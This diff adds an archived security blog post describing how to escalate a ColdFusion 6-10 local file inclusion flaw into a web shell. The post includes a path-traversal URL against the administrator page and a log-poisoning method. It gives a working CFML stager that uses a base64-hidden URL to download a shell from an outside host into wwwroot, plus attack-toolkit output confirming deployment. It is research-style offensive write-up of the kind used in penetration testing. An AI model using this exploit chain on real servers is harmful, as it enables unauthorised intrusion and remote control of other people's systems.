@@ -1,0 +1,294 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>LFI to shell in Coldfusion 6-10 - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="ColdFusion has several very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed. A lesser use of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">LFI to Shell in Coldfusion 6-10</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-02T14:10:04-07:00" pubdate data-updated="true">Apr 2<span>nd</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>
+
+<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>
+
+<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>
+
+<p><img src="/images/posts/2014/cf_log.jpg"></p>
+
+<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>
+
+<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>
+
+<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>
+
+<p><img src="/images/posts/2014/cf_log_fetch.jpg"></p>
+
+<p>Which we can then access from the root directory:</p>
+
+<p><img src="/images/posts/2014/cf_log_exec.jpg"></p>
+
+<p>A quick run of this in clusterd:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
+</span><span class='line'>            [Supporting 5 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
+</span><span class='line'> [2014-04-02 11:28PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-04-02 11:28PM] Server hinted at 'coldfusion'
+</span><span class='line'> [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
+</span><span class='line'> [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
+</span><span class='line'> [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
+</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting completed.
+</span><span class='line'> [2014-04-02 11:28PM] Injecting stager...
+</span><span class='line'> [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
+</span><span class='line'> [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
+</span><span class='line'> [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
+
+<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-02T14:10:04-07:00" pubdate data-updated="true">Apr 2<span>nd</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/clusterd/'>clusterd</a>, <a class='category' href='/blog/categories/coldfusion/'>coldfusion</a>, <a class='category' href='/blog/categories/lfi/'>lfi</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/" title="Previous Post: IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI">&laquo; IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/" title="Next Post: rce in browser exploitation framework (BeEF)">rce in browser exploitation framework (BeEF) &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
